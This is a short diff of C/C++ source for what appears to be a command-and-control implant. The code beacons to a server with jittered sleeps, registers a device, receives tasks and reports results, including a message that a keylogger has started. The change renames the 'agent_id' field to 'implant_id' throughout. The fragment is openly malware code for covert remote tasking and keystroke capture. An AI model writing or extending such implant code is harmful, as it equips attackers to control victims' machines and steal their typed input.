@@ -94,7 +94,7 @@ int main() {
         char id[BUFFER_SIZE];
         read(file, id, sizeof(id));
 
-        // check if agent_id file exists
+        // check if implant_id file exists
         comm.beacon(id);
         sleep(jitter());
     }
@@ -186,7 +186,7 @@ void Communicate_::beacon(const char *id) {
 
     cJSON *bea = cJSON_CreateObject();
     cJSON_AddStringToObject(bea, "mode", "beacon");
-    cJSON_AddStringToObject(bea, "agent_id", id);
+    cJSON_AddStringToObject(bea, "implant_id", id);
     char *data = cJSON_Print(bea);
     send(sock, data, strlen(data), 0);
     free(data);
@@ -227,7 +227,7 @@ void Communicate_::beacon(const char *id) {
         strcpy(result, "Started keylogger Successfully");
 
         cJSON_AddStringToObject(re, "mode", "result");
-        cJSON_AddStringToObject(re, "agent_id", id);
+        cJSON_AddStringToObject(re, "implant_id", id);
         cJSON_AddNumberToObject(re, "task_id", task_id->valueint);
         cJSON_AddStringToObject(re, "response", result);
         char *result_ = cJSON_Print(re);
@@ -257,7 +257,7 @@ void Communicate_::beacon(const char *id) {
     // send result
     SEND_RESULT:
     cJSON_AddStringToObject(re, "mode", "result");
-    cJSON_AddStringToObject(re, "agent_id", id);
+    cJSON_AddStringToObject(re, "implant_id", id);
     cJSON_AddNumberToObject(re, "task_id", task_id->valueint);
     cJSON_AddStringToObject(re, "response", result);
     char *result_ = cJSON_Print(re);
@@ -300,7 +300,7 @@ void Communicate_::reg(Device d) {
         // 
     }
     cJSON *reply = cJSON_Parse(buffer);
-    cJSON *id = cJSON_GetObjectItem(reply, "agent_id");
+    cJSON *id = cJSON_GetObjectItem(reply, "implant_id");
 
     // store id in a file
     // file path
